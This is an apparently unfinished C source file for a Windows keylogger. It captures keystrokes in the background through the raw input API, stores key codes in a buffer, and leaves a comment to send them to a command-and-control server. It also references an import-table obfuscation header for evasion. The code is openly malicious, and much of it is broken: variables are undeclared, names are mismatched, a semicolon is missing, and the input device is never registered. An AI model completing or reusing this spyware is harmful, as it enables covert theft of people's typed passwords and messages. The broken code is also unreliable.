#include <Windows.h>
#include "IATfuscation.h"

#define VKCODE_BUFFER_MAX_SIZE 1024 

VOID ZeroMemory(PVOID destination, SIZE_T size)
{
    PULONG dest = (PULONG)destination;
    SIZE_T count = size / sizeof(ULONG);

    while (count > 0)
    {
        *dest = 0;
        dest++;
        count--;
    }

    return;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{   
    RAWINPUTDEVICE raw_input_device
    static HANDLE  handle;
    RAWINPUT*      buffer;
    UINT           u_size;
 /*
 *  We will store vkCodes into an array and send it away when it's full.
 *  Simple, shouldn't generate too much traffic
 */
    UINT key_codes[VKCODE_BUFFER_MAX_SIZE] = { 0 };
    SIZE_T index = 0;


    switch (msg)
    {
    case WM_CREATE:
        
        raw_input_device.usUsagePage = 0x01;
        raw_input_device.usUsage = 0x06;
        raw_input_device.dwFlags = RIDEV_INPUTSINK;
        raw_input_device.hwndTarget = hwnd;

    case WM_INPUT:
        
        GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
            sizeof(RAWINPUTHEADER));

        // allocate buffer for input data
        buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);

        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
            sizeof(RAWINPUTHEADER)))
        {
            // if this is keyboard message and WM_KEYDOWN, log the key
            if (buffer->header.dwType == RIM_TYPEKEYBOARD && buffer->data.keyboard.Message == WM_KEYDOWN)
            {
                // Check if the array has space for another key
                if (Index < KEYCODEBUFFER_SIZE)
                {
                    KeyCodes[Index] = buffer->data.keyboard.VKey;
                    Index++;
                }
                else
                {
                    // TO-DO: Reset the buffer and send the data to C2
                }
            }
        }

        // free the buffer
        HeapFree(GetProcessHeap(), 0, buffer);
        break;

    case WM_DESTROY:
        // Change the RAWINPUTDEVICE structure in order to remove the device
        raw_input_device.dwFlags = RIDEV_REMOVE; // Remove the device flag
        raw_input_device.hwndTarget = NULL; // No longer interested in messages from the device

        // Call RegisterRawInputDevices to unregister the device
        BOOL result = RegisterRawInputDevices(&raw_input_device, 1, sizeof(RAWINPUTDEVICE));

        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}


int WINAPI WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR lp_cmd_line, int n_cmd_show)
{

#ifdef _WIN64
    PPEB peb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB peb = (PEB*)(__readfsdword(0x30));
#endif

    WNDCLASSEXW window_class;
    WCHAR       window_class_name[] = "EvilWindow"; // Because I'm an evil bastard! >:D
    HWND        window_handle;
    MSG         msg;

    RtlZeroMemoryInternal(&window_class, sizeof(window_class));

    window_class.cbSize = sizeof(WNDCLASSEXW);
    window_class.lpfnWndProc = Wndproc;
    window_class.hInstance = hInstance;
    window_class.lpszClassName = &window_class_name; 

    if (!RegisterClassExW(&window_class))
    {
        return 1;
    }
}
